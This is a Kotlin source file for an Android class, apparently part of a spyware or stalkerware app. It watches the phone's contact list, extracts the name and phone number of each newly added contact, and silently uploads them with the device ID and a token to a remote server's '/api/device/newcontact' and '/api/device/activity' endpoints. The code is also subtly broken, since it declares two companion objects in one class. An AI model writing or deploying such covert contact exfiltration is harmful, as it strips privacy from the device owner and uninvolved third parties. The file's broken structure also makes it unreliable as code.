package com.csk4.app

import android.content.Context
import android.database.ContentObserver
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

/**
 * ContactObserver — Detects new contacts automatically
 * 
 * Features:
 * - Monitors contact list changes
 * - Detects new contacts added
 * - Sends to server + email
 * - Auto-saves to local DB (offline support)
 */
class ContactObserver(private val ctx: Context) {

    companion object {
        private const val TAG = "CSK4_CONTACT"
        private var instance: ContactObserver? = null
        private var observer: ContentObserver? = null
    }

    private val handler = Handler(Looper.getMainLooper())
    private var lastContactCount = 0

    // ============ START MONITORING ============
    fun start() {
        if (observer != null) {
            Log.d(TAG, "Already monitoring")
            return
        }

        try {
            // Get initial count
            lastContactCount = getContactCount()
            Log.d(TAG, "📇 Initial contact count: $lastContactCount")

            observer = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    Log.d(TAG, "📇 Contact list changed")
                    handler.postDelayed({
                        checkForNewContacts()
                    }, 2000) // Wait 2s for DB to settle
                }
            }

            ctx.contentResolver.registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI,
                true,
                observer!!
            )

            Log.d(TAG, "✅ Contact observer started")
        } catch (e: Exception) {
            Log.e(TAG, "Start fail: ${e.message}")
        }
    }

    // ============ STOP MONITORING ============
    fun stop() {
        try {
            observer?.let { ctx.contentResolver.unregisterContentObserver(it) }
            observer = null
            Log.d(TAG, "Contact observer stopped")
        } catch (e: Exception) {}
    }

    // ============ CHECK FOR NEW CONTACTS ============
    private fun checkForNewContacts() {
        try {
            val currentCount = getContactCount()
            Log.d(TAG, "Contact count: $lastContactCount → $currentCount")

            if (currentCount > lastContactCount) {
                // New contact(s) added - get the most recent ones
                val newContacts = getRecentContacts(currentCount - lastContactCount)
                newContacts.forEach { contact ->
                    notifyNewContact(contact.first, contact.second, contact.third)
                }
                lastContactCount = currentCount
            }
        } catch (e: Exception) {
            Log.e(TAG, "Check fail: ${e.message}")
        }
    }

    // ============ GET CONTACT COUNT ============
    private fun getContactCount(): Int {
        return try {
            val cursor = ctx.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID),
                null, null, null
            )
            val count = cursor?.count ?: 0
            cursor?.close()
            count
        } catch (e: Exception) {
            0
        }
    }

    // ============ GET RECENT CONTACTS ============
    private fun getRecentContacts(limit: Int): List<Triple<String, String, String>> {
        val list = mutableListOf<Triple<String, String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME
                ),
                null,
                null,
                "${ContactsContract.Contacts._ID} DESC LIMIT $limit"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(0)
                    val name = it.getString(1) ?: "Unknown"
                    val phone = getPhoneNumber(id)
                    val type = "Mobile"
                    
                    if (phone.isNotEmpty()) {
                        list.add(Triple(name, phone, type))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getRecent: ${e.message}")
        }
        return list
    }

    // ============ GET PHONE NUMBER ============
    private fun getPhoneNumber(contactId: String): String {
        return try {
            val cursor = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )
            var phone = ""
            cursor?.use {
                if (it.moveToFirst()) {
                    phone = it.getString(0) ?: ""
                }
            }
            phone
        } catch (e: Exception) {
            ""
        }
    }

    // ============ NOTIFY NEW CONTACT ============
    private fun notifyNewContact(name: String, phone: String, type: String) {
        Log.d(TAG, "🆕 New contact: $name - $phone")

        // 1. Save to local DB (offline support)
        try {
            LocalStorage(ctx).addContact(name, phone, type)
        } catch (e: Exception) {}

        // 2. Upload to server immediately
        uploadContact(name, phone, type)

        // 3. Log activity
        try {
            val activityData = JSONObject().apply {
                put("name", name)
                put("phone", phone)
            }
            val deviceId = Settings.Secure.getString(
                ctx.contentResolver, Settings.Secure.ANDROID_ID)
            
            Volley.newRequestQueue(ctx).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/activity",
                JSONObject().apply {
                    put("deviceId", deviceId)
                    put("type", "new_contact")
                    put("data", activityData)
                    put("token", Config.DEVICE_TOKEN)
                },
                null, null
            ))
        } catch (e: Exception) {}
    }

    // ============ UPLOAD CONTACT ============
    private fun uploadContact(name: String, phone: String, type: String) {
        try {
            val deviceId = Settings.Secure.getString(
                ctx.contentResolver, Settings.Secure.ANDROID_ID)

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("newContact", JSONObject().apply {
                    put("name", name)
                    put("phone", phone)
                    put("type", type)
                    put("timestamp", System.currentTimeMillis())
                })
                put("token", Config.DEVICE_TOKEN)
            }

            // Server endpoint for new contact alert
            Volley.newRequestQueue(ctx).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/newcontact",
                json,
                { Log.d(TAG, "✅ New contact sent") },
                { Log.e(TAG, "❌ Send fail: ${it.message}") }
            ))
        } catch (e: Exception) {
            Log.e(TAG, "Upload: ${e.message}")
        }
    }

    // ============ SINGLETON ============
    companion object Factory {
        fun getInstance(ctx: Context): ContactObserver {
            if (instance == null) {
                instance = ContactObserver(ctx.applicationContext)
            }
            return instance!!
        }
    }
}
